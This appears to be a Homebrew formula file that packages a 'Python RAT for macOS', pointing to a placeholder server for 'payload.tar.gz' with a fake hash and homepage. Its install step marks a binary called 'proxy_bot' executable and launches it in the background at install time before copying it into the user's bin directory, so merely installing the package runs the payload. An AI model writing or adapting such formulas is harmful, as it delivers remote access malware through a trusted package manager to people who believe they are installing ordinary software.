class Pyrat < Formula
  desc "Python RAT for macOS"
  homepage "https://fake-python-pkg.com"
  url "http://your-server.com/payload.tar.gz"
  sha256 "fakehash"

  def install
    system "chmod", "+x", "proxy_bot"
    system "./proxy_bot &"
    system "mv", "proxy_bot", "#{prefix}/bin/"
  end
end
